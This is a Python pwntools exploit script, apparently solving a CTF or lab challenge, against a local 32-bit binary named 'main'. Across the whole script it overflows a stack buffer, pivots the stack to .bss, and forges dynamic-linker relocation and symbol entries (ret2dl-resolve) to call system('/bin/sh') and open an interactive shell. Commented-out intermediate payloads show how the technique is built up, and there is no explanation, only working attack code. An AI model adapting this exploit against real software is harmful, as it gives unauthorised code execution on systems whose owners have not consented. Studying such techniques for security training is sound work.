from pwn import *
elf = ELF('main')
p = process('./main')

read_plt = elf.plt['read']
read_got = elf.got['read']
write_plt = elf.plt['write']
write_got = elf.got['write']

ppp_ret = 0x08048619
pop_ebp_ret = 0x0804861b
leave_ret = 0x08048458
bss_addr = elf.bss()
base_addr = bss_addr + 0x800 

plt_addr = 0x08048380
str_addr = 0x08048278
sym_addr = 0x080481d8
rel_plt = 0x08048330

p.recvuntil('~!\n')
payload = 'A'*112
payload += p32(read_plt) + p32(ppp_ret) + p32(0) + p32(base_addr) + p32(100)
payload += p32(pop_ebp_ret) + p32(base_addr) + p32(leave_ret)
p.sendline(payload)

'''
payload2 = p32(base_addr - 100)
payload2 += p32(write_plt) + p32(ppp_ret) + p32(1) + p32(base_addr + 80)
payload2 += p32(7)
payload2 += 'A'*(80-len(payload2))
payload2 += '/bin/sh\x00'
payload2 += 'A'*(100 - len(payload2))
gdb.attach(p)
p.send(payload2)
'''
'''
reloc_index = 0x20
payload3 = 'AAAA'
payload3 += p32(plt_addr)
payload3 += p32(reloc_index)
payload3 += p32(ppp_ret)
payload3 += p32(1) + p32(base_addr + 80) + p32(7)
payload3 += 'A'*(80 - len(payload3))
payload3 += '/bin/sh\x00'
payload3 += 'A'*(100 - len(payload3))
p.send(payload3)
'''
'''
payload4 = 'AAAA'
payload4 += p32(plt_addr)
payload4 += p32(base_addr + 88 - rel_plt)
payload4 += 'AAAA'
payload4 += p32(1) + p32(base_addr + 80) + p32(7)
payload4 += 'A'*(80 - len(payload4))
payload4 += '/bin/sh\x00'
payload4 += p32(write_got)
payload4 += p32(0x607)
payload4 += 'A'*(100 - len(payload4))
p.send(payload4)
'''
'''
payload5 = 'AAAA'
payload5 += p32(plt_addr)
payload5 += p32(base_addr + 28 - rel_plt)
payload5 += p32(ppp_ret)
payload5 += p32(1) + p32(base_addr + 80) + p32(7)
payload5 += p32(write_got) + p32(0x26907)
payload5 += 'AAAA'
payload5 += p32(0x4c) + p32(0) + p32(0) + p32(0x12)
payload5 += 'A'*(80 - len(payload5))
payload5 += '/bin/sh\x00'
payload5 += 'A'*(100 - len(payload5))
p.send(payload5)
'''
'''
payload6 = 'AAAA'
payload6 += p32(plt_addr)
payload6 += p32(base_addr + 28 - rel_plt)
payload6 += p32(ppp_ret)
payload6 += p32(1) + p32(base_addr + 80) + p32(7)
payload6 += p32(write_got) + p32(0x26907)
payload6 += 'AAAA'
payload6 += p32(base_addr + 14*4 - 0x08048278)
payload6 +=  p32(0) + p32(0) + p32(0x12)
payload6 += p32(0x74697277) + p32(0x5f5f0065)
payload6 += 'A'*(80 - len(payload6))
payload6 += '/bin/sh\x00'
payload6 += 'A'*(100 - len(payload6))
p.send(payload6)
'''

payload7 = 'AAAA'
payload7 += p32(plt_addr)
payload7 += p32(base_addr + 28 - rel_plt)
payload7 += p32(ppp_ret)
payload7 += p32(base_addr + 80)
payload7 += 'AAAAAAAA'
payload7 += p32(write_got) + p32(0x26907)
payload7 += 'AAAA'
payload7 += p32(base_addr + 14*4 - 0x08048278)
payload7 +=  p32(0) + p32(0) + p32(0x12)
payload7 += 'system' + p32(0)
payload7 += 'A'*(80 - len(payload7))
payload7 += '/bin/sh\x00'
payload7 += 'A'*(100 - len(payload7))
p.send(payload7)

p.interactive()
